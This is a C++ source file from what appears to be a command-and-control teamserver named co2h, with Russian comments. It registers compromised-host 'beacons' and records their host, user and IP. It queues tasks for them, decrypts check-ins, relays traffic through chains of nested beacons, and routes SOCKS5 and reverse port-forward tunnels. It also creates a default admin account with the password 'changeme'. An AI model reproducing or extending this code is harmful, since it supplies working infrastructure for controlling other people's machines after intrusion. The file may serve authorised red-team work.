#include "Core.hpp"
#include "net/OperatorSession.hpp"
#include "listeners/socks5/Socks5Listener.hpp"
#include "listeners/rportfwd/RportfwdListener.hpp"
#include "listeners/https/BeaconCrypto.hpp"
#include "listeners/https/RsaOaep.hpp"

#include <co2h/kv.hpp>
#include <co2h/proto.hpp>
#include <spdlog/spdlog.h>

#include <algorithm>
#include <atomic>
#include <thread>

namespace co2h::server {

std::shared_ptr<Core> Core::create(Config cfg) {
    auto c = std::shared_ptr<Core>(new Core(std::move(cfg)));
    c->db_ = std::make_shared<Database>(c->config_.database);
    c->db_->migrate();
    c->auth_ = std::make_shared<OperatorAuth>(c->db_);
    c->auth_->ensure_default_admin("changeme");
    c->init_tls();
    return c;
}

Core::Core(Config cfg) : config_(std::move(cfg)) {}

void Core::init_tls() {
    op_tls_.set_options(asio::ssl::context::default_workarounds
                      | asio::ssl::context::no_sslv2
                      | asio::ssl::context::no_sslv3
                      | asio::ssl::context::no_tlsv1
                      | asio::ssl::context::no_tlsv1_1
                      | asio::ssl::context::single_dh_use);
    op_tls_.use_certificate_chain_file(config_.tls.cert_file.string());
    op_tls_.use_private_key_file(config_.tls.key_file.string(),
                                 asio::ssl::context::pem);
    if (!config_.tls.ca_file.empty()) {
        op_tls_.load_verify_file(config_.tls.ca_file.string());
        op_tls_.set_verify_mode(asio::ssl::verify_peer
                              | asio::ssl::verify_fail_if_no_peer_cert);
    } else {
        op_tls_.set_verify_mode(asio::ssl::verify_none);
        spdlog::warn("tls.ca not set — operator mTLS disabled (dev mode)");
    }
}

void Core::broadcast_event(proto::EventCategory cat, Bytes payload) {
    std::vector<std::shared_ptr<OperatorSession>> ops;
    {
        std::lock_guard lk{op_mu_};
        ops.reserve(operators_.size());
        for (auto& w : operators_)
            if (auto s = w.lock()) ops.push_back(std::move(s));
    }
    for (auto& s : ops) s->send_event(cat, payload);
}

void Core::broadcast_event_admin(proto::EventCategory cat, Bytes payload) {
    std::vector<std::shared_ptr<OperatorSession>> ops;
    {
        std::lock_guard lk{op_mu_};
        ops.reserve(operators_.size());
        for (auto& w : operators_)
            if (auto s = w.lock())
                if (s->role() == "admin") ops.push_back(std::move(s));
    }
    for (auto& s : ops) s->send_event(cat, payload);
}

void Core::register_operator(std::shared_ptr<OperatorSession> s) {
    std::lock_guard lk{op_mu_};
    operators_.emplace_back(s);
}

void Core::unregister_operator(std::shared_ptr<OperatorSession> s) {
    std::lock_guard lk{op_mu_};
    operators_.erase(
        std::remove_if(operators_.begin(), operators_.end(),
            [&](const std::weak_ptr<OperatorSession>& w){
                auto p = w.lock();
                return !p || p == s;
            }),
        operators_.end());
}

void Core::register_socks_listener(const std::string& beacon_id,
                                   std::shared_ptr<Listener> lst) {
    std::lock_guard lk{socks_mu_};
    socks_map_[beacon_id] = std::move(lst);
}

void Core::unregister_socks_listener(const std::string& beacon_id) {
    std::lock_guard lk{socks_mu_};
    socks_map_.erase(beacon_id);
}

void Core::route_socks_output(const std::string& beacon_id, BytesView data) {
    std::shared_ptr<Listener> lst;
    {
        std::lock_guard lk{socks_mu_};
        auto it = socks_map_.find(beacon_id);
        if (it == socks_map_.end()) return;
        lst = it->second;
    }
    // Listener обязан быть Socks5Listener; dynamic_cast для безопасности.
    if (auto* s5 = dynamic_cast<socks5::Socks5Listener*>(lst.get())) {
        s5->on_beacon_output(data);
    }
}

// ---- Relay child routing -------------------------------------------------

// Вспомогательная функция: построить raw TCP-кадр [u32 total BE][u8 type][payload].
static co2h::Bytes make_tcp_frame(std::uint8_t type, co2h::BytesView payload) {
    std::uint32_t total = static_cast<std::uint32_t>(1 + payload.size());
    co2h::Bytes f;
    f.reserve(5 + payload.size());
    f.push_back(static_cast<std::uint8_t>(total >> 24));
    f.push_back(static_cast<std::uint8_t>(total >> 16));
    f.push_back(static_cast<std::uint8_t>(total >>  8));
    f.push_back(static_cast<std::uint8_t>(total));
    f.push_back(type);
    f.insert(f.end(), payload.begin(), payload.end());
    return f;
}

// Отправить OP_RELAY_RESP задачу родительскому бикону.
static void enqueue_relay_resp(TaskQueue& tasks,
                               const std::string& parent_id,
                               std::uint32_t child_uid,
                               co2h::BytesView raw_tcp_frame) {
    using namespace co2h::kv;
    Writer w;
    w.put_u32("child_uid", child_uid);
    w.put_bytes("data", raw_tcp_frame);
    auto pl = w.finish();
    tasks.enqueue(parent_id, proto::TaskOp::RelayResp,
                  Bytes{pl.begin(), pl.end()}, 0);
}

void Core::route_relay_output(const std::string& parent_id, BytesView data) {
    // Минимум: [u32 child_uid(4)][u8 ttype(1)] = 5 байт.
    if (data.size() < 5) return;

    std::uint32_t child_uid =
        (std::uint32_t(data[0]) << 24) | (std::uint32_t(data[1]) << 16) |
        (std::uint32_t(data[2]) <<  8) |  std::uint32_t(data[3]);
    std::uint8_t ttype = data[4];
    BytesView body{data.data() + 5, data.size() - 5};

    spdlog::debug("relay: parent={} child_uid={} ttype={} body={}b",
                  parent_id, child_uid, ttype, body.size());

    // Ключ в relay-таблице: "parent_id:child_uid"
    std::string relay_key = parent_id + ":" + std::to_string(child_uid);

    // Получаем данные родительского листенера для расшифровки.
    auto parent_sess = sessions_.get(parent_id);
    if (!parent_sess) {
        spdlog::warn("relay: parent session '{}' not found", parent_id);
        return;
    }
    auto lst = listeners_.get(parent_sess->listener);
    crypto::AesKey listener_key{};
    BytesView rsa_priv{};
    if (lst) {
        listener_key = lst->listener_key_data();
        rsa_priv     = lst->rsa_priv_data();
    } else {
        spdlog::warn("relay: listener '{}' not found for parent={} — child checkin will fail",
                     parent_sess->listener, parent_id);
    }

    if (ttype == proto::tport::kCheckin) {
        // Расшифровать метаданные дочернего бикона.
        auto pt = https::open_frame(listener_key, body);
        if (!pt) {
            spdlog::warn("relay checkin: decrypt failed child_uid={} listener={} key_zero={}",
                         child_uid, parent_sess->listener, lst == nullptr);
            return;
        }
        kv::Reader r{{pt->data(), pt->size()}};

        BeaconSession cs;
        {
            std::array<std::uint8_t, 8> raw{};
            co2h::crypto::random_bytes(raw.data(), raw.size());
            cs.id = co2h::hex_encode({raw.data(), raw.size()});
        }
        cs.listener   = parent_sess->listener;
        cs.parent_id  = parent_id;
        cs.hostname   = std::string{r.get_str("host").value_or("")};
        cs.username   = std::string{r.get_str("user").value_or("")};
        cs.pid        = r.get_u32("pid").value_or(0);
        cs.arch       = std::string{r.get_str("arch").value_or("x64")};
        cs.internal_ip = std::string{r.get_str("ip").value_or("")};
        cs.first_seen = cs.last_seen = std::chrono::system_clock::now();

        // Ключ сессии: RSA-wrapped или fallback на listener_key.
        cs.session_key = listener_key;
        auto wrapped = r.get_bytes("wrapped_key");
        if (wrapped && !rsa_priv.empty()) {
            auto dec = https::rsa_oaep_decrypt(rsa_priv,
                                               {wrapped->data(), wrapped->size()});
            if (dec && dec->size() == cs.session_key.size()) {
                std::copy(dec->begin(), dec->end(), cs.session_key.begin());
            }
        }

        sessions_.create_or_update(cs);
        spdlog::info("relay child checkin id={} parent={} host={}",
                     cs.id, parent_id, cs.hostname);

        // Сохранить маппинг child_uid → child_beacon_id.
        {
            std::lock_guard lk{relay_mu_};
            relay_child_map_[relay_key] = cs.id;
        }

        // Ответ дочернему: зашифрован listener_key.
        kv::Writer rw;
        rw.put_str("beacon_id", cs.id);
        auto enc = https::seal_frame(listener_key, rw.finish());
        auto frame = make_tcp_frame(proto::tport::kCheckin,
                                    {enc.data(), enc.size()});
        enqueue_relay_resp(tasks_, parent_id, child_uid, frame);

    } else if (ttype == proto::tport::kPoll) {
        std::string child_id;
        {
            std::lock_guard lk{relay_mu_};
            auto it = relay_child_map_.find(relay_key);
            if (it == relay_child_map_.end()) {
                spdlog::warn("relay poll: child_uid={} not in map (key='{}')",
                             child_uid, relay_key);
                return;
            }
            child_id = it->second;
        }
        auto child_sess = sessions_.get(child_id);
        if (!child_sess) return;
        child_sess->last_seen = std::chrono::system_clock::now();

        auto drained = tasks_.drain(child_id);
        kv::Writer tw;
        tw.put_u32("count", static_cast<std::uint32_t>(drained.size()));
        for (std::size_t i = 0; i < drained.size(); ++i) {
            auto idx = std::to_string(i);
            tw.put_u64("id_"       + idx, drained[i].id);
            tw.put_u32("op_"       + idx, static_cast<std::uint32_t>(drained[i].op));
            tw.put_bytes("payload_"+ idx,
                         {drained[i].payload.data(), drained[i].payload.size()});
        }
        auto enc   = https::seal_frame(child_sess->session_key, tw.finish());
        auto frame = make_tcp_frame(proto::tport::kTasks,
                                    {enc.data(), enc.size()});
        enqueue_relay_resp(tasks_, parent_id, child_uid, frame);

    } else if (ttype == proto::tport::kOutput) {
        std::string child_id;
        {
            std::lock_guard lk{relay_mu_};
            auto it = relay_child_map_.find(relay_key);
            if (it == relay_child_map_.end()) {
                spdlog::warn("relay output: child_uid={} not in map (key='{}')",
                             child_uid, relay_key);
                return;
            }
            child_id = it->second;
        }
        auto child_sess = sessions_.get(child_id);
        if (!child_sess) return;
        child_sess->last_seen = std::chrono::system_clock::now();

        auto pt = https::open_frame(child_sess->session_key, body);
        if (pt) {
            kv::Reader r{{pt->data(), pt->size()}};

            // Получаем task_id и числом, и строкой — защита от from_chars на граничных uint64.
            auto task_id_sv = r.get_str("task_id").value_or(std::string_view{});
            auto task_id    = r.get_u64("task_id").value_or(0);
            auto out        = r.get_bytes("output").value_or(BytesView{});
            auto err        = r.get_str("error").value_or("");
            auto is_last    = r.get_u32("is_last").value_or(1);
            auto resp       = r.get_u32("resp").value_or(2);

            static constexpr std::uint64_t    kRelayMagic    = 0xFFFFFFFFFFFFFFFDULL;
            static constexpr std::uint64_t    kSocksMagic    = 0xFFFFFFFFFFFFFFFEULL;
            static constexpr std::string_view kRelayMagicStr = "18446744073709551613";
            static constexpr std::string_view kSocksMagicStr = "18446744073709551614";

            bool is_relay = (task_id == kRelayMagic) || (task_id_sv == kRelayMagicStr);
            bool is_socks = (task_id == kSocksMagic) || (task_id_sv == kSocksMagicStr);

            if (is_relay) {
                // Вложенный relay: child_id является промежуточным ретранслятором,
                // его дочерний биконe шлёт relay-данные — обрабатываем рекурсивно.
                spdlog::debug("relay nested: parent={} child={} out={}b",
                              parent_id, child_id, out.size());
                if (!out.empty())
                    route_relay_output(child_id, out);
            } else if (is_socks) {
                if (!out.empty())
                    route_socks_output(child_id, out);
            } else {
                kv::Writer ew;
                ew.put_str("beacon_id", child_id);
                ew.put_u64("task_id",   task_id);
                ew.put_u32("is_last",   is_last);
                ew.put_u32("resp",      resp);
                if (!err.empty()) ew.put_str("error", std::string{err});
                if (!out.empty()) ew.put_bytes("output", out);
                broadcast_event(proto::EventCategory::Tasks, ew.finish());
            }
        }
        // ACK: [u32 total=1 BE][u8 TPORT_ACK]
        auto frame = make_tcp_frame(proto::tport::kAck, {});
        enqueue_relay_resp(tasks_, parent_id, child_uid, frame);
    }
}

// ---- Rportfwd routing -------------------------------------------------------

void Core::register_rportfwd_listener(const std::string& beacon_id,
                                      std::shared_ptr<Listener> lst) {
    std::lock_guard lk{rportfwd_mu_};
    rportfwd_map_[beacon_id] = std::move(lst);
}

void Core::unregister_rportfwd_listener(const std::string& beacon_id) {
    std::lock_guard lk{rportfwd_mu_};
    rportfwd_map_.erase(beacon_id);
}

void Core::route_rportfwd_output(const std::string& beacon_id, BytesView data) {
    std::shared_ptr<Listener> lst;
    {
        std::lock_guard lk{rportfwd_mu_};
        auto it = rportfwd_map_.find(beacon_id);
        if (it == rportfwd_map_.end()) return;
        lst = it->second;
    }
    if (auto* rpf = dynamic_cast<rportfwd::RportfwdListener*>(lst.get())) {
        rpf->on_beacon_output(data);
    }
}

void Core::run(int threads) {
    if (threads <= 0) {
        threads = static_cast<int>(std::thread::hardware_concurrency());
        if (threads <= 0) threads = 2;
    }
    auto work = asio::make_work_guard(io_);
    for (int i = 0; i < threads; ++i) {
        workers_.emplace_back([this]{ io_.run(); });
    }
    spdlog::info("teamserver io running on {} threads", threads);

    for (auto& w : workers_) w.join();
    workers_.clear();
}

void Core::stop() {
    if (stopping_.exchange(true)) return;
    listeners_.stop_all();
    io_.stop();
}

}
